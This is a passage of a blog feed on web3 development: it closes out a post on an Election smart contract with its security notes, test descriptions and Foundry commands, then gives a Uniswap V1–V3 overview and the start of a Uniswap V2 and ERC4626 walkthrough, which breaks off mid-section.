&lt;p&gt;&lt;code&gt;Election_Candidate_Registered&lt;&#x2F;code&gt;: Emitted when a new candidate is registered.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Election_Voter_Registered&lt;&#x2F;code&gt;: Emitted when a new voter is registered.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Election_Voted&lt;&#x2F;code&gt;: Emitted when a vote is cast.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Election_Winner_Declared&lt;&#x2F;code&gt;: Emitted when the election winner is declared.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Election_Election_Started&lt;&#x2F;code&gt; : Emitted when election was started by owner.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;&#x2F;h2&gt;
&lt;p&gt;The Election smart contract incorporates several security considerations to protect the integrity of the election process:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Access Control:&lt;&#x2F;strong&gt; The contract uses an onlyOwner modifier, which employs a simple authorization check to restrict access to sensitive functions such as registerCandidate and revealResults. This ensures that only the owner can perform certain actions 1.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Checks-Effects-Interactions Pattern:&lt;&#x2F;strong&gt; The contract adheres to the Checks-Effects-Interactions pattern by performing checks first (such as verifying if a voter or candidate is already registered), updating the contract state, and then emitting events 13.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;State Variable Visibility:&lt;&#x2F;strong&gt; State variables such as owner, totalNumOfVoters, and totalNumOfCandidates are declared public, allowing transparency and verification of contract state by external observers 25.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Use of Custom Errors:&lt;&#x2F;strong&gt; The contract uses custom error messages for reverting transactions when certain conditions are not met. This helps in reducing gas costs compared to using require with string messages and improves clarity regarding why a transaction failed 1.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;```solidity
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Not_Owner();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Voter_Already_Registered();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Candidate_Already_Registered();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Invalid_Candidate();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Already_Voted();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Voter_Not_Registered();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Election_Running();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Election_Completed();
&lt;&#x2F;span&gt;&lt;span&gt;error Election_Invalid_Duration();
&lt;&#x2F;span&gt;&lt;span&gt;```
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;Event Emission:&lt;&#x2F;strong&gt; Events are emitted for key actions such as voter registration, candidate registration, vote casting, and winner declaration. This allows for off-chain monitoring and verification of contract interactions 3.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Minimal Use of Loops:&lt;&#x2F;strong&gt; The contract avoids extensive use of loops, which can lead to out-of-gas errors. The only loop present is in the revealResults function, which iterates through candidates to determine the winner. This loop is bound by the number of candidates, which is expected to be a manageable number 13.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;No External Calls:&lt;&#x2F;strong&gt; The contract does not make external calls to other contracts, which reduces the risk of reentrancy attacks and unexpected interactions with untrusted contracts 12.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Immutable Owner:&lt;&#x2F;strong&gt; The owner is set once upon contract deployment and is not changeable. This prevents potential takeover attacks where the ownership could be transferred to a malicious party 1.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;No Ether Handling:&lt;&#x2F;strong&gt; The contract does not handle Ether transactions, which means there&#x27;s no risk associated with sending and receiving Ether, nor any need for a fallback function 1.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;test-cases&quot;&gt;Test Cases&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;setUp:&lt;&#x2F;strong&gt; This function initializes the test environment. It creates instances of the Election contract and assigns addresses to voters and candidates.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testInitialElectionState:&lt;&#x2F;strong&gt; This test checks the initial state of the Election contract. It asserts that the owner is set correctly, and that the initial number of voters, election duration, and election start time are all zero.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRegisterVoter:&lt;&#x2F;strong&gt; This test verifies the functionality of the registerVoter function. It checks that a voter can be registered, and that attempting to register the same voter twice causes a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRegisterVoterDuringElection:&lt;&#x2F;strong&gt; This test checks that a voter cannot be registered during an election. It attempts to register a voter while an election is running and expects a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRegisterCandidate:&lt;&#x2F;strong&gt; This test verifies the registration of candidates. It checks that a candidate can be registered, that attempting to register the same candidate twice causes a revert, and that attempting to register an invalid candidate also causes a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRegisterCandidateDuringElection:&lt;&#x2F;strong&gt; This test checks that a candidate cannot be registered during an election. It attempts to register a candidate while an election is running and expects a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testStartElection&lt;&#x2F;strong&gt;: This test checks the startElection function. It verifies that an election can be started, and that starting an election with an invalid duration causes a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testStartElectionAlreadyRunning:&lt;&#x2F;strong&gt; This test verifies that an election cannot be started if another one is already running. It attempts to start an election while another one is running and expects a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testCastVote:&lt;&#x2F;strong&gt; This test checks the castVote function. It verifies that a vote can be cast by a registered voter, and that attempting to cast a vote with an unregistered voter or an invalid candidate causes a revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testGetMajority:&lt;&#x2F;strong&gt; This test checks the getMajority function. It verifies that the majority of votes is calculated correctly for a single candidate.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testIsElectionActive:&lt;&#x2F;strong&gt; This test checks the isElectionActive function. It verifies that the function correctly identifies whether an election is currently active.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRevealResults:&lt;&#x2F;strong&gt; This test verifies the revealResults function. It checks that the function correctly declares the winner of an election.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRevealResultsMultipleWinners:&lt;&#x2F;strong&gt; This test checks that the revealResults function correctly handles elections with multiple winners.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRevealResultsNotOwner:&lt;&#x2F;strong&gt; This test checks that the revealResults function can only be called by the owner of the election.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testScript:&lt;&#x2F;strong&gt; This test verifies the execution of the ElectionScript. It checks that the script runs successfully and that the Election contract instance it creates is valid.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;mj0ln1r@Linux:~&#x2F;decentralized_voting_system$ forge coverage
&lt;&#x2F;span&gt;&lt;span&gt;[‚†¢] Compiling...
&lt;&#x2F;span&gt;&lt;span&gt;[‚†ä] Compiling 24 files with 0.8.23
&lt;&#x2F;span&gt;&lt;span&gt;[‚†î] Solc 0.8.23 finished in 7.80s
&lt;&#x2F;span&gt;&lt;span&gt;Compiler run successful!
&lt;&#x2F;span&gt;&lt;span&gt;Analysing contracts...
&lt;&#x2F;span&gt;&lt;span&gt;Running tests...
&lt;&#x2F;span&gt;&lt;span&gt;| File                  | % Lines         | % Statements   | % Branches     | % Funcs       |
&lt;&#x2F;span&gt;&lt;span&gt;|-----------------------|-----------------|----------------|----------------|---------------|
&lt;&#x2F;span&gt;&lt;span&gt;| script&#x2F;Election.s.sol | 100.00% (3&#x2F;3)   | 100.00% (3&#x2F;3)  | 100.00% (0&#x2F;0)  | 100.00% (1&#x2F;1) |
&lt;&#x2F;span&gt;&lt;span&gt;| src&#x2F;Election.sol      | 100.00% (55&#x2F;55) | 96.34% (79&#x2F;82) | 88.24% (30&#x2F;34) | 100.00% (7&#x2F;7) |
&lt;&#x2F;span&gt;&lt;span&gt;| Total                 | 100.00% (58&#x2F;58) | 96.47% (82&#x2F;85) | 88.24% (30&#x2F;34) | 100.00% (8&#x2F;8) |
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;clone&quot;&gt;Clone&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ git clone 
&lt;&#x2F;span&gt;&lt;span&gt;$ cd 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;build&quot;&gt;Build&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge build
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;test&quot;&gt;Test&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge test
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;deploy&quot;&gt;Deploy&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge script script&#x2F;Election.s.sol:ElectionScript --rpc-url &amp;lt;your_rpc_url&amp;gt; --private-key &amp;lt;your_private_key&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Uniswap V1_V2_V3 Overview</title>
        <published>2024-01-09T00:00:00+00:00</published>
        <updated>2024-01-09T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/posts/uniswap-overview/"/>
        <id>https://themj0ln1r.github.io/posts/uniswap-overview/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/posts/uniswap-overview/">&lt;p&gt;Hey hi all, I got something useful for all web3 learners. Past few days I spent to understand bits and bytes of the Uniswap Protocol. I gathered the best resources to learn all the things about Uniswap V2. During my learning I have taken notes of every thing that I learned. In this post you can get an gist of &lt;strong&gt;Uniswap DEX&lt;&#x2F;strong&gt; Protocol. You can check my &lt;a href=&quot;https:&#x2F;&#x2F;themj0ln1r.github.io&#x2F;posts&#x2F;uniswapv2complete&quot;&gt;Uniswap V2 Complete Code Walkthrough&lt;&#x2F;a&gt; post to learn everything about Uniswap V2.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;uniswap&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap&quot; aria-label=&quot;Anchor link for: uniswap&quot;&gt;Uniswap&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Uniswap is an automated ethereum-based crypto exchange with its own governance token, UNI.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;uniswap-v1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap-v1&quot; aria-label=&quot;Anchor link for: uniswap-v1&quot;&gt;Uniswap V1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;It introduced the ETH&#x2F;ERC20 liquidity pool, where LPs (Liquidity Providers) could deposit tokens in exchange for liquidity tokens.&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap V1 uses the &lt;code&gt;X * Y = K&lt;&#x2F;code&gt; constant product equation to calculate token price where&lt;&#x2F;p&gt;
&lt;p&gt;X is the amount of token 1,&lt;&#x2F;p&gt;
&lt;p&gt;Y is the amount of token 2, and&lt;&#x2F;p&gt;
&lt;p&gt;K is the constant that the liquidity pool‚Äôs smart contract keeps the same throughout swaps.&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap V1 model faces many issues involving &lt;strong&gt;slippage&lt;&#x2F;strong&gt; - the change in price of a token because of your trade, and a &lt;strong&gt;lack of dedicated token-only pools&lt;&#x2F;strong&gt; that forces users to interact with two pools to trade between non-native tokens.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-overview&#x2F;uniswapv1_dai_usdc.png&quot; &gt;
&lt;p&gt;First, the buyer interacts with the¬†&lt;strong&gt;DAI&#x2F;ETH&lt;&#x2F;strong&gt;¬†pool to swap his¬†&lt;strong&gt;DAI&lt;&#x2F;strong&gt;¬†for¬†&lt;strong&gt;ETH&lt;&#x2F;strong&gt;, then uses that¬†&lt;strong&gt;ETH&lt;&#x2F;strong&gt;¬†to interact with the¬†&lt;strong&gt;USDC&#x2F;ETH&lt;&#x2F;strong&gt;¬†pool which outputs¬†&lt;strong&gt;USDC&lt;&#x2F;strong&gt;¬†in exchange for the¬†&lt;strong&gt;ETH&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap V1 has a flat¬†&lt;strong&gt;0.3%&lt;&#x2F;strong&gt;¬†fee for LPs (Liquidity Providers) to incentivize participation in the network, which must be taken into account as well in the equation.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Weakness :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Uniswap V1 model faces is the weakness to price manipulation like¬†&lt;strong&gt;front-running&lt;&#x2F;strong&gt;¬†and¬†&lt;strong&gt;sandwich attacks&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;uniswap-v2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap-v2&quot; aria-label=&quot;Anchor link for: uniswap-v2&quot;&gt;Uniswap V2&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;The Uniswap V2 was launched in May, 2020 with a plethora of new features including &lt;strong&gt;TWAP&lt;&#x2F;strong&gt; (Time Weighted Average Price), &lt;strong&gt;Liquidity pools&lt;&#x2F;strong&gt; &lt;strong&gt;for non-native tokens&lt;&#x2F;strong&gt; which halves gas fees and slippage for token swaps, and &lt;strong&gt;Flash Swaps&lt;&#x2F;strong&gt;. In addition, this update removed native token functionality in favor of &lt;strong&gt;WETH&lt;&#x2F;strong&gt; (Wrapped Ether) and is written in Solidity - a welcome change for readability.&lt;&#x2F;p&gt;
&lt;p&gt;The¬†&lt;strong&gt;0.3%&lt;&#x2F;strong&gt;¬†fee model was shortly modified after release by members of the DAO, where¬†&lt;strong&gt;0.05%&lt;&#x2F;strong&gt;¬†of the fee‚Äôs funds are reserved for the development of the Uniswap network.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;twap&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#twap&quot; aria-label=&quot;Anchor link for: twap&quot;&gt;&lt;strong&gt;TWAP&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;TWAP&lt;&#x2F;strong&gt;¬†works by averaging a price for a token in a pool over a set period of time, making manipulating prices extremely difficult. Each new block pairs measure the market price before trades take place.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-overview&#x2F;uniswapv2_cumulative.png&quot; &gt;
&lt;p&gt;Let‚Äôs say we wish to measure the¬†&lt;strong&gt;TWAP&lt;&#x2F;strong&gt;¬†of a token price over a set of time¬†&lt;code&gt;T&lt;&#x2F;code&gt;. The equation to find the TWAP price is calculated by dividing the cumulative price (or the aforementioned¬†&lt;code&gt;priceCumulative&lt;&#x2F;code&gt;¬†variable in the pictures) by¬†&lt;code&gt;T&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This gives us an average price that is resilient to an outlier price given by the oracle. For example, if a token were to be manipulated at block¬†&lt;strong&gt;10&lt;&#x2F;strong&gt;¬†with an¬†&lt;em&gt;outrageous&lt;&#x2F;em&gt;¬†price, instead of drawing this inaccurate reading to be the true price of swap, it is averaged between blocks¬†&lt;strong&gt;6&lt;&#x2F;strong&gt;,¬†&lt;strong&gt;7&lt;&#x2F;strong&gt;,¬†&lt;strong&gt;8&lt;&#x2F;strong&gt;, and¬†&lt;strong&gt;9&lt;&#x2F;strong&gt;¬†which read much closer to the accurate price. Therefore,¬†&lt;strong&gt;much&lt;&#x2F;strong&gt;¬†less slippage&#x2F;manipulation is realized by the end user.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-overview&#x2F;uniswapv2_twap.png&quot; &gt;
&lt;p&gt;&lt;strong&gt;Flash Swaps :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Uniswap V2 flash swaps&lt;&#x2F;strong&gt;¬†allow you to withdraw as much as you want of any ERC20 token on Uniswap at no upfront cost and do anything you want with them (execute arbitrary code), provided that by the end of the transaction execution, you either:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Pay for all ERC20 tokens withdrawn&lt;&#x2F;li&gt;
&lt;li&gt;Pay for a percentage of ERC20 tokens and return the rest&lt;&#x2F;li&gt;
&lt;li&gt;Return all ERC20 tokens withdrawn&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Liquidity provider fees are enforced by subtracting 0.3% from all input amounts, even if the input ERC20 tokens are being returned as part of a flash swap.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-overview&#x2F;uniswapv2_flash.png&quot;&gt;
&lt;h1 id=&quot;uniswap-v3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap-v3&quot; aria-label=&quot;Anchor link for: uniswap-v3&quot;&gt;Uniswap V3&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Uniswap V3 was launched on May 5, 2021 with numerous features among many others:¬†&lt;strong&gt;concentrated liquidity&lt;&#x2F;strong&gt;,¬†&lt;strong&gt;multiple fee tiers&lt;&#x2F;strong&gt;,¬†&lt;strong&gt;non-fungible liquidity&lt;&#x2F;strong&gt;, and¬†&lt;strong&gt;improved TWAP oracles&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Concentrated liquidity :&lt;&#x2F;strong&gt;¬†Giving individual LPs granular control over what price ranges their capital is allocated to. Individual positions are aggregated together into a single pool, forming one combined curve for users to trade against&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Multiple fee tiers :&lt;&#x2F;strong&gt; Allowing LPs to be appropriately compensated for taking on varying degrees of risk&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Non-fungible liquidity :&lt;&#x2F;strong&gt; As a byproduct of per-LP custom price curves, liquidity positions are no longer fungible and are not represented as ERC20 tokens in the core protocol.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Improved TWAP Oracles :&lt;&#x2F;strong&gt; Uniswap v3 offers significant improvements to the TWAP oracle, making it possible to calculate any recent TWAP within the past ~9 days in a single on-chain call. This is achieved by storing an array of cumulative sums instead of just one.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Improved TWAP Oracles :&lt;&#x2F;strong&gt; Uniswap v3 offers significant improvements to the TWAP oracle, making it possible to calculate any recent TWAP within the past ~9 days in a single on-chain call. This is achieved by storing an array of cumulative sums instead of just one.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;References&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;concepts&#x2F;uniswap-protocol&quot; target=_blank&gt;Uniswap Docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you &amp;lt;3&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Uniswap V2 Complete Code Walkthrough</title>
        <published>2024-01-09T00:00:00+00:00</published>
        <updated>2024-01-09T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/posts/uniswapv2-complete/"/>
        <id>https://themj0ln1r.github.io/posts/uniswapv2-complete/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/posts/uniswapv2-complete/">&lt;p&gt;Hello all, This post is all about &lt;strong&gt;Uniswap V2 Contracts&lt;&#x2F;strong&gt;. This is the notes written by me while learning Uniswap V2 from various resources. I have written short notes on each and every line of code in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;&quot; target=_blank&gt;UniswapV2 Core Contracts&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-periphery&#x2F;&quot; target=_blank&gt;UniswapV2 Periphery Contracts&lt;&#x2F;a&gt;. You can check my &lt;a href=&quot;https:&#x2F;&#x2F;themj0ln1r.github.io&#x2F;posts&#x2F;uniswapv2overview&quot;&gt;Uniswap V1_V2_V3 Overview&lt;&#x2F;a&gt; post to get a an overview on Uniswap protocol.&lt;&#x2F;p&gt;
&lt;p&gt;I have used many resources to learn about UniswapV2. This notes aggregates &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;uniswap-v2-book&quot; target=_blank&gt;Rareskills UniswapV2 Book&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;0xOwenThurm&#x2F;status&#x2F;1662805937575596034&quot; target=_blank&gt;@0xOwneThurm&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ProgrammerSmart&quot; target=_blank&gt;@ProgrammerSmart&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;Younsle1&quot; target=_blank&gt;@Zer0luck.eth&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;officer_cia&quot; target=_blank&gt;@officer_cia&lt;&#x2F;a&gt; and few the great anons.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;I am very grateful to all these legends for the knowledge&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-1-erc4626-vaults&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-1-erc4626-vaults&quot; aria-label=&quot;Anchor link for: chapter-1-erc4626-vaults&quot;&gt;&lt;strong&gt;Chapter-1 : ERC4626 Vaults&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;ERC4626 is a tokenized vault standard that uses ERC20 tokens to represent shares of some other asset.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_1.png&quot;&gt;
&lt;p&gt;When an ERC4626 contract gives you an ERC20 token for the initial deposit, it gives you token S (an ERC20 compliant token). ERC4626 contract is also &lt;strong&gt;ERC20&lt;&#x2F;strong&gt; token.&lt;&#x2F;p&gt;
&lt;p&gt;The ERC4626 extends the ERC20 contract and during construction phase, it takes as an argument the other ERC20 token users will be depositing to it. Therefore, ERC4626 supports all the functions and events you expect from ERC20. The token of ERC4626 contract is referred to &lt;strong&gt;shares&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Each ERC4626 contract only supports &lt;strong&gt;one asset&lt;&#x2F;strong&gt;. You cannot deposit multiple kinds of ERC20 tokens into the contract and get shares back.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Why ERC4626 ?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Let‚Äôs say we all own a company, or a liquidity pool, that earns a stablecoin DAI periodically. The stablecoin DAI is the asset in this case.&lt;&#x2F;p&gt;
&lt;p&gt;One inefficient way we could distribute the earnings is to push out DAI to each of the holders of the company on a pro-rata basis. But this would be extremely expensive gas wise.&lt;&#x2F;p&gt;
&lt;p&gt;Instead, this is how the workflow would work with ERC4626.&lt;&#x2F;p&gt;
&lt;p&gt;Let‚Äôs say you and ten friends get together and each deposit 10 DAI each into the ERC4626 vault. You get back one share.&lt;&#x2F;p&gt;
&lt;p&gt;So far so good. Now your company earns 10 more DAI, so the total DAI inside the vault is now 110 DAI.&lt;&#x2F;p&gt;
&lt;p&gt;When you trade your share back for your part of the DAI, you don‚Äôt get 10 DAI back, but 11.&lt;&#x2F;p&gt;
&lt;p&gt;Now there is 99 DAI in the vault, but 9 people to share it among. If they were to each withdraw, they would get 11 DAI each.&lt;&#x2F;p&gt;
&lt;p&gt;Note how efficient this is. When someone makes a trade, instead of updating everyones shares one-by-one, only the total supply of shares and the amount of assets in the contract changes.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;methods&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#methods&quot; aria-label=&quot;Anchor link for: methods&quot;&gt;&lt;strong&gt;Methods&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ethereum.org&#x2F;en&#x2F;developers&#x2F;docs&#x2F;standards&#x2F;tokens&#x2F;erc-4626&#x2F;&quot;&gt;https:&#x2F;&#x2F;ethereum.org&#x2F;en&#x2F;developers&#x2F;docs&#x2F;standards&#x2F;tokens&#x2F;erc-4626&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Giving assets, getting shares: deposit() and mint()&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;According to the EIP, the user is depositing assets and getting shares back, so what&#x27;s the difference between these two functions?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;With &lt;em&gt;deposit()&lt;&#x2F;em&gt;, you &lt;strong&gt;specify how many assets&lt;&#x2F;strong&gt; you want to put in, and the function will calculate how many shares to send to you.&lt;&#x2F;li&gt;
&lt;li&gt;With &lt;em&gt;mint()&lt;&#x2F;em&gt;, you &lt;strong&gt;specify how many shares&lt;&#x2F;strong&gt; you want, and the function will calculate how much of the ERC20 asset to transfer from you.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Of course, if you don‚Äôt have enough assets to transfer in to the contract, the transaction will revert.&lt;&#x2F;p&gt;
&lt;p&gt;The uint256 that gets returned to you is &lt;strong&gt;amount of shares&lt;&#x2F;strong&gt; you get back.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_2.png&quot;&gt;
&lt;p&gt;&lt;strong&gt;Anticipating how many shares you will get&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;previewDeposit&lt;&#x2F;li&gt;
&lt;li&gt;previewMint&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Like their state changing counterparts, previewDeposit takes assets as an argument and previewMint takes shares as an argument.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Anticipating how many shares you will get under ideal conditions&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Confusingly enough, there is also a view function called &lt;strong&gt;convertToShares&lt;&#x2F;strong&gt; which takes assets as an argument and returns the amount of shares you will get back under ideal conditions (no slippage or fees).&lt;&#x2F;p&gt;
&lt;p&gt;Why would you care about this ideal information that doesn‚Äôt reflect the trade you will execute?&lt;&#x2F;p&gt;
&lt;p&gt;The difference between ideal and actual results tells you how much your trade is impacting the market and how the fee depends on trade size. A smart contract could do a binary search on the difference between convertToShares and previewMint to find the best trade size to execute.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Returning shares, getting assets back&lt;&#x2F;strong&gt;
